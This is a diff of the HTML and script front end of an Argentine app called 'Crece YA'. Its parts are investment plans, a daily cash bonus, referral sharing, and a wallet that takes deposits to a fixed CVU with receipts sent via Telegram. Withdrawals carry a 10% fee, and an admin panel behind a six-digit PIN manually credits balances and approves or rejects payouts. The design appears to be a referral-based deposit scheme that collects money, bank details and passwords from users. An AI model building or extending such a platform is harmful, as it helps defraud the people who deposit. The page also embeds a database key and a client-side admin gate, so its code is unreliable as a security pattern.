               <i class="fa-solid fa-calendar-check"></i>
             </div>
             <div>
-              <span class="text-sm font-bold text-slate-900 block text-main">Check-in Diario</span>
-              <span id="checkin-status-text" class="text-xs text-amber-700 font-mono font-medium">+$500 ARS listos para reclamar</span>
+              <span class="text-xs font-bold text-slate-900 block">Check-in Diario</span>
+              <span id="checkin-status-text" class="text-[10px] text-amber-700 font-mono font-medium">+$500 ARS listos para reclamar</span>
             </div>
           </div>
-          <button id="btn-claim-daily" class="px-4 py-2 bg-amber-400 hover:bg-amber-300 text-slate-950 text-xs font-black rounded-xl transition shadow cursor-pointer">
+          <button id="btn-claim-daily" class="px-3.5 py-1.5 bg-amber-400 hover:bg-amber-300 text-slate-950 text-xs font-extrabold rounded-xl transition shadow">
             Cobrar
           </button>
         </div>
 
-        <!-- DATOS BANCARIOS (ESTADO DINÁMICO DE VALIDACIÓN) -->
-        <div class="card-theme p-4 bg-white border border-sky-200 rounded-2xl space-y-3 text-xs">
+        <div class="p-3.5 bg-white border border-sky-200 rounded-2xl space-y-2.5 text-xs">
           <div class="flex justify-between items-center">
-            <span class="font-bold text-slate-800 text-sm text-main">Cuenta Bancaria para Retiros</span>
-            <span id="bank-status-badge" class="flex items-center gap-1 text-xs font-mono font-bold"></span>
+            <span class="font-bold text-slate-800">Cuenta Bancaria para Retiros</span>
+            <span id="bank-status-badge" class="flex items-center gap-1 text-[10px] font-mono text-amber-600 font-bold">
+              <span class="w-2 h-2 rounded-full bg-amber-500 animate-pulse"></span> 🟠 En proceso de validación
+            </span>
           </div>
 
-          <div class="space-y-2.5 text-xs">
+          <div class="space-y-2 text-[11px]">
             <div>
-              <label class="text-slate-400 block text-[11px] mb-0.5 text-sub">NOMBRE Y APELLIDO DEL TITULAR</label>
-              <input id="prof-name-input" type="text" class="subbox-theme w-full bg-slate-50 border border-slate-200 rounded-xl p-2 font-medium text-slate-900 text-main outline-none" placeholder="Tu Nombre Completo">
+              <label class="text-slate-400 block text-[10px]">NOMBRE Y APELLIDO DEL TITULAR</label>
+              <input id="prof-name-input" type="text" class="w-full bg-slate-50 border border-slate-200 rounded-lg p-1.5 font-medium text-slate-900 outline-none" placeholder="Tu Nombre Completo (debe coincidir con la cuenta)">
             </div>
             <div class="grid grid-cols-2 gap-2">
               <div>
-                <label class="text-slate-400 block text-[11px] mb-0.5 text-sub">CBU O CVU PERSONAL</label>
-                <input id="prof-cvu-input" type="text" maxlength="22" class="subbox-theme w-full bg-slate-50 border border-slate-200 rounded-xl p-2 font-mono text-slate-900 text-main outline-none" placeholder="22 dígitos">
+                <label class="text-slate-400 block text-[10px]">CBU O CVU PERSONAL</label>
+                <input id="prof-cvu-input" type="text" class="w-full bg-slate-50 border border-slate-200 rounded-lg p-1.5 font-mono text-slate-900 outline-none" placeholder="22 dígitos">
               </div>
               <div>
-                <label class="text-slate-400 block text-[11px] mb-0.5 text-sub">ALIAS BANCARIO</label>
-                <input id="prof-alias-input" type="text" class="subbox-theme w-full bg-slate-50 border border-slate-200 rounded-xl p-2 font-mono text-slate-900 text-main outline-none" placeholder="Ej: tu.alias.mp">
+                <label class="text-slate-400 block text-[10px]">ALIAS BANCARIO</label>
+                <input id="prof-alias-input" type="text" class="w-full bg-slate-50 border border-slate-200 rounded-lg p-1.5 font-mono text-slate-900 outline-none" placeholder="Ej: tu.alias.mp">
               </div>
             </div>
-            <button id="btn-save-profile" class="w-full py-2 bg-slate-800 hover:bg-slate-700 text-white font-bold rounded-xl transition mt-1 cursor-pointer">
+            <button id="btn-save-profile" class="w-full py-1.5 bg-slate-800 hover:bg-slate-700 text-white font-bold rounded-lg transition">
               Guardar Datos de Cobro
             </button>
           </div>
         </div>
 
-        <!-- CAMBIO DE CONTRASEÑA -->
-        <div class="card-theme p-4 bg-white border border-sky-200 rounded-2xl space-y-3 text-xs">
-          <div class="flex items-center gap-2 border-b border-sky-100 pb-2">
-            <i class="fa-solid fa-key text-sky-600 text-sm"></i>
-            <span class="font-bold text-slate-800 text-sm text-main">Seguridad / Cambiar Contraseña</span>
-          </div>
-
-          <div class="space-y-2.5 text-xs">
+        <a href="https://t.me/+7obUJU1X2sg0NGEx" target="_blank" class="p-3 bg-sky-500 hover:bg-sky-400 text-white rounded-2xl flex items-center justify-between shadow-sm transition">
+          <div class="flex items-center gap-2">
+            <i class="fa-brands fa-telegram text-xl"></i>
             <div>
-              <label class="text-slate-400 block text-[11px] mb-0.5 text-sub">CONTRASEÑA ACTUAL</label>
-              <div class="flex items-center bg-slate-50 border border-slate-200 rounded-xl px-2.5 py-1.5 subbox-theme">
-                <input id="prof-old-pass" type="password" placeholder="Tu contraseña actual" class="w-full bg-transparent font-mono text-slate-900 text-main outline-none">
-                <button type="button" onclick="togglePassView('prof-old-pass', this)" class="text-slate-400 hover:text-sky-500 ml-1.5 text-xs cursor-pointer">
-                  <i class="fa-solid fa-eye"></i>
-                </button>
-              </div>
+              <span class="text-xs font-bold block">Canal Oficial & Soporte</span>
+              <span class="text-[10px] text-sky-100">Atención de Lunes a Viernes 07:00 a 18:00 hs</span>
             </div>
-            <div class="grid grid-cols-2 gap-2">
-              <div>
-                <label class="text-slate-400 block text-[11px] mb-0.5 text-sub">NUEVA CONTRASEÑA</label>
-                <input id="prof-new-pass" type="password" placeholder="Nueva clave" class="subbox-theme w-full bg-slate-50 border border-slate-200 rounded-xl p-2 font-mono text-slate-900 text-main outline-none">
-              </div>
-              <div>
-                <label class="text-slate-400 block text-[11px] mb-0.5 text-sub">REPETIR NUEVA</label>
-                <input id="prof-new-pass-confirm" type="password" placeholder="Repetir clave" class="subbox-theme w-full bg-slate-50 border border-slate-200 rounded-xl p-2 font-mono text-slate-900 text-main outline-none">
-              </div>
-            </div>
-            <button id="btn-change-pass" class="w-full py-2 bg-sky-600 hover:bg-sky-500 text-white font-bold rounded-xl transition mt-1 cursor-pointer">
-              Actualizar Contraseña
-            </button>
+          </div>
+          <i class="fa-solid fa-chevron-right text-xs"></i>
+        </a>
+
+        <div class="p-3.5 bg-white border border-sky-200 rounded-2xl space-y-2">
+          <h3 class="text-xs font-bold text-slate-800">Historial de Movimientos</h3>
+          <div id="tx-history-container" class="space-y-1.5 text-[11px] font-mono">
+            <p class="text-slate-400 text-center py-2">Sin movimientos registrados aún.</p>
           </div>
         </div>
-
-        <a href="https://whatsapp.com/channel/0029Vb8mCGGLI8YahzbVBb0G" target="_blank" class="p-3.5 bg-emerald-600 hover:bg-emerald-500 text-white rounded-2xl flex items-center justify-between shadow-sm transition">
-          <div class="flex items-center gap-3">
-            <i class="fa-brands fa-whatsapp text-2xl"></i>
-            <div>
-              <span class="text-sm font-bold block">Canal Oficial en WhatsApp</span>
-              <span class="text-xs text-emerald-100">Noticias del Mercado y Alertas Oficiales</span>
-            </div>
-          </div>
-          <i class="fa-solid fa-chevron-right text-xs"></i>
-        </a>
-
-        <a href="https://t.me/creceya2026" target="_blank" class="p-3.5 bg-sky-500 hover:bg-sky-400 text-white rounded-2xl flex items-center justify-between shadow-sm transition">
-          <div class="flex items-center gap-3">
-            <i class="fa-brands fa-telegram text-2xl"></i>
-            <div>
-              <span class="text-sm font-bold block">Canal Oficial en Telegram</span>
-              <span class="text-xs text-sky-100">@creceya2026 • Comunidad y Difusión</span>
-            </div>
-          </div>
-          <i class="fa-solid fa-chevron-right text-xs"></i>
-        </a>
       </div>
     </div>
 
-    <!-- BARRA INFERIOR -->
+    <!-- ================= BARRA INFERIOR FIJA ================= -->
     <nav class="fixed bottom-0 left-1/2 -translate-x-1/2 w-full max-w-sm bg-white/95 backdrop-blur-md border-t border-sky-200 grid grid-cols-4 py-2 px-2 text-center text-xs z-40 gap-1 shadow-lg">
-      <button onclick="switchTab('planes')" id="nav-btn-planes" class="bg-sky-600 text-white py-2 rounded-xl font-bold flex flex-col items-center gap-0.5 shadow-sm transition cursor-pointer">
-        <i class="fa-solid fa-chart-pie text-sm"></i>
-        <span class="text-[10px]">Planes</span>
+      <button onclick="switchTab('planes')" id="nav-btn-planes" class="bg-sky-600 text-white py-1.5 rounded-xl font-bold flex flex-col items-center gap-0.5 shadow-sm transition">
+        <i class="fa-solid fa-chart-pie text-xs"></i>
+        <span class="text-[9px]">Planes</span>
       </button>
-      <button onclick="switchTab('productos')" id="nav-btn-productos" class="nav-btn-inactive bg-sky-50 text-sky-800 hover:bg-sky-100 py-2 rounded-xl font-semibold flex flex-col items-center gap-0.5 transition cursor-pointer">
-        <i class="fa-solid fa-box-open text-sm"></i>
-        <span class="text-[10px]">Productos</span>
+      <button onclick="switchTab('productos')" id="nav-btn-productos" class="bg-sky-50 text-sky-800 hover:bg-sky-100 py-1.5 rounded-xl font-semibold flex flex-col items-center gap-0.5 transition">
+        <i class="fa-solid fa-box-open text-xs"></i>
+        <span class="text-[9px]">Productos</span>
       </button>
-      <button onclick="switchTab('compartir')" id="nav-btn-compartir" class="nav-btn-inactive bg-sky-50 text-sky-800 hover:bg-sky-100 py-2 rounded-xl font-semibold flex flex-col items-center gap-0.5 transition cursor-pointer">
-        <i class="fa-solid fa-share-nodes text-sm"></i>
-        <span class="text-[10px]">Compartir</span>
+      <button onclick="switchTab('compartir')" id="nav-btn-compartir" class="bg-sky-50 text-sky-800 hover:bg-sky-100 py-1.5 rounded-xl font-semibold flex flex-col items-center gap-0.5 transition">
+        <i class="fa-solid fa-share-nodes text-xs"></i>
+        <span class="text-[9px]">Compartir</span>
       </button>
-      <button onclick="switchTab('perfil')" id="nav-btn-perfil" class="nav-btn-inactive bg-sky-50 text-sky-800 hover:bg-sky-100 py-2 rounded-xl font-semibold flex flex-col items-center gap-0.5 transition cursor-pointer">
-        <i class="fa-solid fa-user text-sm"></i>
-        <span class="text-[10px]">Mi Perfil</span>
+      <button onclick="switchTab('perfil')" id="nav-btn-perfil" class="bg-sky-50 text-sky-800 hover:bg-sky-100 py-1.5 rounded-xl font-semibold flex flex-col items-center gap-0.5 transition">
+        <i class="fa-solid fa-user text-xs"></i>
+        <span class="text-[9px]">Mi Perfil</span>
       </button>
     </nav>
 
-    <!-- MODAL BILLETERA -->
+    <!-- ================= MODAL BILLETERA ================= -->
     <div id="wallet-modal" class="fixed inset-0 z-50 bg-[#020912]/85 backdrop-blur-md hidden flex items-center justify-center p-3">
-      <div class="bg-[#0b1726] border border-sky-900/60 w-full max-w-sm rounded-3xl p-5 shadow-2xl space-y-4 text-slate-100">
-        <div class="flex items-center justify-between border-b border-slate-800/80 pb-2.5">
+      <div class="bg-[#0b1726] border border-sky-900/60 w-full max-w-sm rounded-3xl p-4 shadow-2xl space-y-3.5 text-slate-100">
+        
+        <div class="flex items-center justify-between border-b border-slate-800/80 pb-2">
           <div class="flex items-center gap-2">
-            <button onclick="closeWalletModal()" class="text-slate-400 hover:text-white text-base cursor-pointer">
+            <button onclick="closeWalletModal()" class="text-slate-400 hover:text-white text-sm">
               <i class="fa-solid fa-arrow-left"></i>
             </button>
-            <h3 class="text-sm font-bold text-white tracking-wide">Billetera</h3>
+            <h3 class="text-xs font-bold text-white tracking-wide">Billetera</h3>
           </div>
-          <button onclick="closeWalletModal()" class="text-slate-400 hover:text-white text-base cursor-pointer">
-            <i class="fa-solid fa-clock-rotate-left"></i>
+          <button onclick="closeWalletModal()" class="text-slate-400 hover:text-white text-sm">
+            <i class="fa-solid fa-xmark"></i>
           </button>
         </div>
 
         <div class="grid grid-cols-2 p-1 bg-[#132337] rounded-xl text-xs font-bold">
-          <button id="wallet-tab-recargar" type="button" onclick="setWalletMode('recargar')" class="py-2.5 rounded-lg bg-sky-500 text-slate-950 font-bold transition cursor-pointer">
+          <button id="wallet-tab-recargar" onclick="setWalletMode('recargar')" class="py-2 rounded-lg bg-sky-500 text-slate-950 transition">
             Recargar
           </button>
-          <button id="wallet-tab-retirar" type="button" onclick="setWalletMode('retirar')" class="py-2.5 rounded-lg text-slate-400 hover:text-white font-bold transition cursor-pointer">
+          <button id="wallet-tab-retirar" onclick="setWalletMode('retirar')" class="py-2 rounded-lg text-slate-400 hover:text-white transition">
             Retirar
           </button>
         </div>
 
-        <div class="p-3.5 bg-[#132337]/70 rounded-2xl border border-sky-900/40 flex justify-between items-center text-xs">
+        <div class="p-3 bg-[#132337]/70 rounded-2xl border border-sky-900/40 flex justify-between items-center text-xs">
           <span class="text-slate-400">Monto disponible</span>
-          <strong id="wallet-available-bal" class="font-mono text-base text-sky-400">$0.00 ARS</strong>
+          <strong id="wallet-available-bal" class="font-mono text-sm text-sky-400">$0.00 ARS</strong>
         </div>
 
-        <!-- BOX RECARGA -->
-        <div id="wallet-recarga-box" style="display: block;" class="space-y-3.5">
-          <div class="p-3.5 bg-[#132337]/50 border border-sky-800/50 rounded-2xl space-y-1.5">
-            <div class="flex justify-between items-center text-xs text-slate-400 font-mono">
+        <!-- SECCIÓN RECARGA -->
+        <div id="wallet-recarga-box" class="space-y-3">
+          <div class="p-3 bg-[#132337]/50 border border-sky-800/50 rounded-2xl space-y-1">
+            <div class="flex justify-between items-center text-[10px] text-slate-400 font-mono">
               <span>CVU OFICIAL DE DEPÓSITO</span>
               <span class="text-sky-400 font-bold">Billetera / Banco</span>
             </div>
             <div class="flex items-center justify-between gap-1 pt-1">
               <span id="cvu-text-val" class="font-mono font-bold text-xs text-white select-all">0000168300000008340656</span>
-              <button id="btn-copy-cvu" onclick="copyOfficialCVU()" class="px-3 py-1.5 bg-sky-600 hover:bg-sky-500 text-white text-xs font-black rounded-lg transition shrink-0 cursor-pointer">
+              <button id="btn-copy-cvu" onclick="copyOfficialCVU()" class="px-2.5 py-1 bg-sky-600 hover:bg-sky-500 text-white text-[10px] font-black rounded-lg transition shrink-0">
                 Copiar
               </button>
             </div>
           </div>
 
           <div>
-            <label class="text-xs text-slate-400 block mb-1">Seleccionar monto de recarga</label>
-            <div class="grid grid-cols-2 gap-2 text-xs font-mono">
-              <button onclick="setDepositValue(2000)" class="py-2.5 bg-[#132337] hover:bg-sky-900/50 rounded-xl font-bold text-slate-200 border border-slate-800 cursor-pointer">2,000.00</button>
-              <button onclick="setDepositValue(5000)" class="py-2.5 bg-[#132337] hover:bg-sky-900/50 rounded-xl font-bold text-slate-200 border border-slate-800 cursor-pointer">5,000.00</button>
-              <button onclick="setDepositValue(15000)" class="py-2.5 bg-[#132337] hover:bg-sky-900/50 rounded-xl font-bold text-slate-200 border border-slate-800 cursor-pointer">15,000.00</button>
-              <button onclick="setDepositValue(50000)" class="py-2.5 bg-[#132337] hover:bg-sky-900/50 rounded-xl font-bold text-slate-200 border border-slate-800 cursor-pointer">50,000.00</button>
+            <label class="text-[10px] text-slate-400 block mb-1">Seleccionar monto de recarga</label>
+            <div class="grid grid-cols-2 gap-1.5 text-xs font-mono">
+              <button onclick="setDepositValue(2000)" class="py-2 bg-[#132337] hover:bg-sky-900/50 rounded-xl font-bold text-slate-200 border border-slate-800">2,000.00</button>
+              <button onclick="setDepositValue(5000)" class="py-2 bg-[#132337] hover:bg-sky-900/50 rounded-xl font-bold text-slate-200 border border-slate-800">5,000.00</button>
+              <button onclick="setDepositValue(15000)" class="py-2 bg-[#132337] hover:bg-sky-900/50 rounded-xl font-bold text-slate-200 border border-slate-800">15,000.00</button>
+              <button onclick="setDepositValue(50000)" class="py-2 bg-[#132337] hover:bg-sky-900/50 rounded-xl font-bold text-slate-200 border border-slate-800">50,000.00</button>
             </div>
           </div>
 
           <div>
-            <label class="text-[11px] text-slate-400 block mb-1">O escribe un monto personalizado:</label>
-            <input id="deposit-custom-input" type="number" min="2000" value="2000" placeholder="Monto mínimo $2.000 ARS" class="w-full bg-[#132337] border border-slate-800 rounded-xl p-3 text-xs font-mono font-bold text-white outline-none">
-            <span class="text-[10px] text-amber-400 block mt-1">El monto mínimo de depósito es de $2.000,00 ARS</span>
+            <input id="deposit-custom-input" type="number" min="2000" placeholder="Ingrese un monto (mín. 2.000,00)" class="w-full bg-[#132337] border border-slate-800 rounded-xl p-2.5 text-xs font-mono font-bold text-white outline-none">
+            <span class="text-[10px] text-slate-500 block mt-1">Monto mínimo en pesos: $2.000 ARS</span>
           </div>
 
-          <button id="btn-notify-deposit" onclick="notifyDepositTelegram()" class="w-full py-3 bg-sky-500 hover:bg-sky-400 text-slate-950 font-black text-xs rounded-xl transition shadow flex items-center justify-center gap-2 cursor-pointer">
-            <i class="fa-brands fa-telegram text-base"></i> Notificar y Enviar Comprobante
+          <button onclick="notifyDepositTelegram()" class="w-full py-2.5 bg-sky-500 hover:bg-sky-400 text-slate-950 font-black text-xs rounded-xl transition shadow flex items-center justify-center gap-2">
+            <i class="fa-brands fa-telegram"></i> Notificar y Enviar Comprobante
           </button>
         </div>
 
-        <!-- BOX RETIRO CON REVISIÓN PREVIA DE DATOS -->
-        <div id="wallet-retiro-box" style="display: none;" class="space-y-3 text-xs">
-          <div id="withdraw-step-input" class="space-y-3">
-            <div>
-              <label class="text-xs text-slate-400 block mb-1">Monto de retiro (Mínimo $5.000 ARS)</label>
-              <div class="grid grid-cols-2 gap-2 font-mono mb-2">
-                <button onclick="setWithdrawValue(5000)" class="py-2 bg-[#132337] hover:bg-sky-900/50 rounded-xl font-bold text-slate-200 border border-slate-800 cursor-pointer">5,000.00</button>
-                <button onclick="setWithdrawValue(15000)" class="py-2 bg-[#132337] hover:bg-sky-900/50 rounded-xl font-bold text-slate-200 border border-slate-800 cursor-pointer">15,000.00</button>
-              </div>
-              <input id="withdraw-custom-input" type="number" min="5000" placeholder="Monto a retirar (mínimo $5.000 ARS)" class="w-full bg-[#132337] border border-slate-800 rounded-xl p-2.5 font-mono font-bold text-white outline-none">
-              <span class="text-[10px] text-amber-400 block mt-1">Mínimo de extracción: $5.000 ARS. Límite: 1 retiro cada 24 hs.</span>
-            </div>
-
-            <div class="space-y-2 bg-[#132337]/60 p-3 rounded-2xl border border-sky-900/40">
-              <div>
-                <label class="text-[11px] text-slate-300 block mb-0.5 font-bold">TITULAR DE LA CUENTA DE DESTINO</label>
-                <input id="withdraw-dest-name" type="text" placeholder="Nombre completo del titular bancario" class="w-full bg-[#081320] border border-slate-700 rounded-xl p-2 text-white font-medium outline-none">
-              </div>
-              <div>
-                <label class="text-[11px] text-slate-300 block mb-0.5 font-bold">TU CBU O CVU PERSONAL DE COBRO</label>
-                <input id="withdraw-dest-cvu" type="text" maxlength="22" placeholder="22 dígitos de tu Mercado Pago, Ualá o banco" class="w-full bg-[#081320] border border-slate-700 rounded-xl p-2 font-mono text-white outline-none">
-              </div>
-            </div>
-
-            <div class="p-2.5 bg-[#132337] rounded-xl border border-slate-800 font-mono text-xs space-y-1">
-              <div class="flex justify-between text-slate-400">
-                <span>Retención administrativa:</span>
-                <span class="text-rose-400 font-bold">10%</span>
-              </div>
-              <div class="flex justify-between text-white font-bold">
-                <span>Neto que recibirás:</span>
-                <span id="withdraw-net-calc" class="text-sky-400">$0.00 ARS</span>
-              </div>
-            </div>
-
-            <button onclick="prepararConfirmacionRetiro()" class="w-full py-3 bg-sky-500 hover:bg-sky-400 text-slate-950 font-black text-xs rounded-xl transition shadow cursor-pointer">
-              Revisar y Confirmar Retiro
-            </button>
+        <!-- SECCIÓN RETIRO SEPARADA -->
+        <div id="wallet-retiro-box" class="hidden space-y-3 text-xs">
+          <div>
+            <label class="text-[10px] text-slate-400 block mb-1">CBU / CVU PERSONAL DE DESTINO (22 DÍGITOS)</label>
+            <input id="withdraw-custom-cvu" type="text" maxlength="22" placeholder="Ingresa los 22 dígitos de tu cuenta" class="w-full bg-[#132337] border border-slate-800 rounded-xl p-2.5 font-mono font-bold text-white outline-none">
           </div>
 
-          <!-- PASO DE REVISIÓN Y CONFIRMACIÓN CON CONTRASEÑA -->
-          <div id="withdraw-step-confirm" class="hidden space-y-3 bg-[#081320] p-3.5 rounded-2xl border border-sky-500/50">
-            <div class="border-b border-slate-800 pb-2 flex justify-between items-center">
-              <span class="font-bold text-sky-400 text-xs uppercase tracking-wide">Verifica tus datos bancarios</span>
-              <button onclick="cancelarRevisionRetiro()" class="text-xs text-slate-400 hover:text-white underline cursor-pointer">Modificar</button>
-            </div>
-
-            <div class="space-y-1.5 text-xs font-mono">
-              <div class="flex justify-between text-slate-300">
-                <span class="text-slate-400">Titular:</span>
-                <strong id="review-dest-name" class="text-white">...</strong>
-              </div>
-              <div class="flex justify-between text-slate-300">
-                <span class="text-slate-400">CBU / CVU:</span>
-                <strong id="review-dest-cvu" class="text-amber-400">...</strong>
-              </div>
-              <div class="flex justify-between text-slate-300">
-                <span class="text-slate-400">Neto a transferir:</span>
-                <strong id="review-dest-net" class="text-emerald-400 font-black text-sm">$0 ARS</strong>
-              </div>
-            </div>
-
-            <div class="pt-2 border-t border-slate-800 space-y-1.5">
-              <label class="text-[11px] text-slate-300 block font-bold">Confirma ingresando tu contraseña de inicio:</label>
-              <div class="flex items-center bg-[#132337] border border-slate-700 rounded-xl px-3 py-2 text-xs">
-                <i class="fa-solid fa-lock text-slate-400 mr-2"></i>
-                <input id="withdraw-fund-pass" type="password" placeholder="Tu contraseña de cuenta" class="bg-transparent text-white w-full outline-none font-mono">
-                <button type="button" onclick="togglePassView('withdraw-fund-pass', this)" class="text-slate-400 hover:text-white ml-2 text-xs cursor-pointer">
-                  <i class="fa-solid fa-eye"></i>
-                </button>
-              </div>
-            </div>
-
-            <button onclick="ejecutarRetiroFinal()" class="w-full py-3 bg-emerald-500 hover:bg-emerald-400 text-slate-950 font-black text-xs rounded-xl transition shadow cursor-pointer">
-              Confirmar Extracción Definitiva
-            </button>
+          <div>
+            <label class="text-[10px] text-slate-400 block mb-1">TITULAR DE LA CUENTA BANCARIA</label>
+            <input id="withdraw-custom-holder" type="text" placeholder="Nombre completo del titular" class="w-full bg-[#132337] border border-slate-800 rounded-xl p-2.5 font-medium text-white outline-none">
           </div>
+
+          <div>
+            <label class="text-[10px] text-slate-400 block mb-1">Monto a retirar (mínimo $5.000 ARS)</label>
+            <div class="grid grid-cols-2 gap-1.5 font-mono mb-2">
+              <button onclick="setWithdrawValue(5000)" class="py-1.5 bg-[#132337] hover:bg-sky-900/50 rounded-xl font-bold text-slate-200 border border-slate-800">5,000.00</button>
+              <button onclick="setWithdrawValue(15000)" class="py-1.5 bg-[#132337] hover:bg-sky-900/50 rounded-xl font-bold text-slate-200 border border-slate-800">15,000.00</button>
+            </div>
+            <input id="withdraw-custom-input" type="number" min="5000" placeholder="Ingrese monto a retirar" class="w-full bg-[#132337] border border-slate-800 rounded-xl p-2.5 font-mono font-bold text-white outline-none">
+            <span class="text-[10px] text-slate-500 block mt-1">Límite operativo: 1 retiro cada 24 hs</span>
+          </div>
+
+          <div class="p-2.5 bg-[#132337] rounded-xl border border-slate-800 font-mono text-[11px] space-y-1">
+            <div class="flex justify-between text-slate-400">
+              <span>Comisión de salida:</span>
+              <span class="text-rose-400 font-bold">10%</span>
+            </div>
+            <div class="flex justify-between text-white font-bold">
+              <span>Neto a recibir en cuenta:</span>
+              <span id="withdraw-net-calc" class="text-sky-400">$0.00 ARS</span>
+            </div>
+          </div>
+
+          <div>
+            <input id="withdraw-fund-pass" type="password" placeholder="Confirma con tu contraseña" class="w-full bg-[#132337] border border-slate-800 rounded-xl p-2.5 text-xs text-white outline-none font-mono">
+          </div>
+
+          <button onclick="confirmWithdrawAction()" class="w-full py-2.5 bg-sky-500 hover:bg-sky-400 text-slate-950 font-black text-xs rounded-xl transition shadow">
+            Confirmar Retiro
+          </button>
         </div>
+
       </div>
     </div>
 
-    <!-- MODAL ADMIN CENTRAL -->
-    <div id="admin-modal" class="fixed inset-0 z-50 bg-[#020813]/90 backdrop-blur-md hidden flex items-center justify-center p-4">
-      <div class="bg-[#0b1b2d] border border-sky-800/80 w-full max-w-sm rounded-3xl p-5 shadow-2xl space-y-4 max-h-[85vh] flex flex-col">
-        <div class="flex items-center justify-between border-b border-sky-900/60 pb-2.5">
-          <h3 class="text-sm font-bold text-sky-400 flex items-center gap-2">
-            <i class="fa-solid fa-user-shield"></i> Consola Central Crece YA
+    <!-- ================= MODAL ADMIN (161928) ================= -->
+    <div id="admin-modal" class="fixed inset-0 z-50 bg-black/85 backdrop-blur-xs hidden flex items-center justify-center p-4">
+      <div class="bg-white border border-amber-400 w-full max-w-sm rounded-3xl p-4 shadow-2xl space-y-3">
+        <div class="flex items-center justify-between border-b pb-2">
+          <h3 class="text-xs font-bold text-amber-600 flex items-center gap-1.5">
+            <i class="fa-solid fa-lock"></i> Panel Administrativo Central
           </h3>
-          <button onclick="closeAdminModal()" class="text-slate-400 hover:text-white cursor-pointer">
-            <i class="fa-solid fa-xmark text-base"></i>
+          <button onclick="closeAdminModal()" class="text-slate-400 hover:text-slate-700">
+            <i class="fa-solid fa-xmark text-sm"></i>
           </button>
         </div>
 
-        <div id="admin-auth-box" class="space-y-3">
-          <label class="text-xs text-sky-300/80 block">INGRESA LA CLAVE MAESTRA</label>
-          <input id="admin-pin-input" type="password" maxlength="6" placeholder="••••••" class="w-full bg-[#13283f] border border-sky-700/60 rounded-xl p-2.5 text-center text-base font-mono tracking-widest text-sky-300 outline-none">
-          <button id="btn-admin-unlock" class="w-full py-2.5 bg-sky-500 hover:bg-sky-400 text-slate-950 font-extrabold text-xs rounded-xl transition cursor-pointer">
+        <div id="admin-auth-box" class="space-y-2.5">
+          <label class="text-[10px] text-slate-400 block">INGRESA LA CLAVE MAESTRA</label>
+          <input id="admin-pin-input" type="password" maxlength="6" placeholder="••••••" class="w-full bg-slate-50 border border-slate-200 rounded-xl p-2 text-center text-sm font-mono tracking-widest outline-none">
+          <button id="btn-admin-unlock" class="w-full py-2 bg-amber-500 hover:bg-amber-400 text-slate-950 font-bold text-xs rounded-xl transition">
             Desbloquear
           </button>
         </div>
 
-        <div id="admin-dashboard-box" class="hidden flex-1 flex flex-col space-y-3 overflow-hidden">
-          <div class="flex justify-between items-center text-xs">
-            <span class="font-bold text-white">Solicitudes Pendientes en Vivo</span>
-            <div class="flex gap-2 items-center">
-              <button onclick="bloquearConsolaAdmin()" class="text-[10px] text-rose-400 hover:underline font-mono cursor-pointer">
-                <i class="fa-solid fa-lock"></i> Bloquear
-              </button>
-              <button onclick="cargarSolicitudesAdmin()" class="text-sky-400 hover:underline flex items-center gap-1 font-mono cursor-pointer">
-                <i class="fa-solid fa-rotate-right"></i> Refrescar
+        <div id="admin-dashboard-box" class="hidden space-y-3 text-xs">
+          <div class="p-2.5 bg-slate-50 rounded-xl border border-slate-200 space-y-2">
+            <span class="font-bold text-slate-800 block text-[11px]">Aprobar Recarga Manual</span>
+            <div class="flex gap-2">
+              <input id="admin-credit-amount" type="number" value="2000" class="w-full bg-white border border-slate-200 rounded-lg p-1.5 font-mono text-xs font-bold">
+              <button id="btn-admin-credit" class="px-3 bg-emerald-500 hover:bg-emerald-600 text-white font-bold rounded-lg text-xs shrink-0">
+                Acreditar
               </button>
             </div>
           </div>
 
-          <button onclick="auditarBonosAdmin()" class="w-full py-2 bg-indigo-600/30 hover:bg-indigo-600 border border-indigo-500/50 text-indigo-200 hover:text-white font-bold text-xs rounded-xl transition cursor-pointer flex items-center justify-center gap-1.5">
-            <i class="fa-solid fa-wand-magic-sparkles"></i> Auditar y Sincronizar Bonos
-          </button>
+          <div class="p-2.5 bg-slate-50 rounded-xl border border-slate-200 space-y-2">
+            <span class="font-bold text-slate-800 block text-[11px]">Validación de Invitado</span>
+            <button id="btn-admin-validate-guest" class="w-full py-2 bg-sky-600 hover:bg-sky-700 text-white font-bold rounded-lg text-xs">
+              Validar 1er Depósito de Invitado
+            </button>
+          </div>
 
-          <div id="admin-deposits-list" class="space-y-3 overflow-y-auto pr-1 flex-1">
-            <p class="text-[11px] text-slate-400 text-center py-6">Cargando solicitudes...</p>
+          <div class="p-2.5 bg-slate-50 rounded-xl border border-slate-200 space-y-2">
+            <span class="font-bold text-slate-800 block text-[11px]">Gestión de Retiros</span>
+            <div class="grid grid-cols-2 gap-2">
+              <button id="btn-admin-liquidate-w" class="py-1.5 bg-emerald-500 hover:bg-emerald-600 text-white font-bold rounded-lg text-xs">
+                Liquidar Retiro
+              </button>
+              <button id="btn-admin-reject-w" class="py-1.5 bg-rose-500 hover:bg-rose-600 text-white font-bold rounded-lg text-xs">
+                Rechazar (Reintegro)
+              </button>
+            </div>
           </div>
         </div>
       </div>
@@ -669,184 +494,144 @@
 
   </main>
 
-  <!-- LÓGICA JAVASCRIPT BLINDADA -->
+  <!-- ================= LÓGICA JAVASCRIPT ================= -->
   <script>
-    const SUPABASE_API_URL = "https://jsixgpftuhtepudyektf.supabase.co/rest/v1";
-    const SUPABASE_PUBLISHABLE_KEY = "sb_publishable_1I5At-aenvWS_w6YhDLu9w_rkAeGHjL";
-
-    const urlParams = new URLSearchParams(window.location.search);
-    const referredByUrl = urlParams.get('ref') || null;
-
-    async function supabaseRequest(endpoint, method = 'GET', body = null) {
-      const headers = {
-        'Content-Type': 'application/json',
-        'apikey': SUPABASE_PUBLISHABLE_KEY,
-        'Authorization': `Bearer ${SUPABASE_PUBLISHABLE_KEY}`,
-        'Prefer': 'resolution=merge-duplicates,return=representation'
-      };
-      const options = { method, headers };
-      if (body) options.body = JSON.stringify(body);
-      try {
-        const res = await fetch(`${SUPABASE_API_URL}/${endpoint}`, options);
-        if (!res.ok) {
-          const errBody = await res.text();
-          console.warn(`Supabase Error (${res.status}):`, errBody);
-          return null;
-        }
-        return await res.json();
-      } catch (e) {
-        console.warn("Supabase Network Warning:", e);
-        return null;
+    const SUPABASE_URL = "https://jsixgpftuhtepudyektf.supabase.co";
+    const SUPABASE_ANON_KEY = "sb_publishable_1I5At-aenvWS_w6YhDLu9w_rkAeGHjL";
+    let supabase = null;
+    try {
+      if (window.supabase) {
